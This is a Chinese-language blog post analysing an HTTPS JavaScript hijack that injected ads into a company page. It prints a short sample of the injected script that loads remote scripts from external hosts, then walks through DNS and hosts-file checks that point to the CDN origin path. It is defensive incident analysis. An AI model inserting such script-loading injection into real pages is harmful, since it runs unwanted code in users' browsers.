---
layout: post
title: HTTPS DNS劫持案例
tags: 技术 原创
---

今天早晨到公司后，同事反馈页面中存在注入广告。打开同事提供的页面链接后，第一次没有发现，刷新了大约10次终于发现了这个广告。

顺藤摸瓜找到被劫持的url，请求报文如下：
{% highlight text %}
Request URL:https://domain-a.com/stats.js
Request Method:GET
Status Code:200 OK
Remote Address:111.111.111.19:443
{% endhighlight %}

https协议的js文件被篡改成如下信息（示意文件，做了删改排版）：
{% highlight js %}
var a=document.createElement("script");
a.src="http://domain-b/entrance.js";
document.getElementsByTagName("head")[0].appendChild(a);

var b=document.createElement("script");
b.src="http://222.222.222.235/?url=domain-a.com/stats.js";
document.getElementsByTagName("head")[0].appendChild(b);
{% endhighlight %}

这是典型的js劫持，但这次HTTPS被劫持是**中间人劫持**呢？还是**证书泄露**？或者是其他情况？拉来安全的同事一起分析被劫持的页面请求现场。

HTTPS的静态文件被劫持，可能存在的情况主要有下面三种情况：

1. 证书泄露（被劫持的js文件是一个大公司的文件，证书泄露可能性较小）；
2. 中间人劫持；
3. CDN回源路径中存在劫持。

## 排查步骤如下

1、打开新的浏览器窗口，重复请求被劫持的链接

结果：同一个js未被劫持，再一次验证劫持是随机发生的。

2、打开[站长之家Ping查询](http://ping.chinaz.com/)和[IPIP Ping查询](http://www.ipip.net/ping.php)查询`domain-a.com`域名DNS结果，确认是否存在`111.111.111.19`这个IP。

结果：两个查询都不存在，疑似是劫持者服务器IP。

3、绑定本地hosts文件，再次请求被劫持的URL`https://domain-a.com/stats.js`
{% highlight text %}
111.111.111.19 domain-a.com
{% endhighlight %}
结果：劫持内容复现，证书签名正确，排除中间人劫持，进一步怀疑是CDN回源路径中存在劫持。

## 基本概念
1. [劫持](https://en.wikipedia.org/wiki/DNS_hijacking)
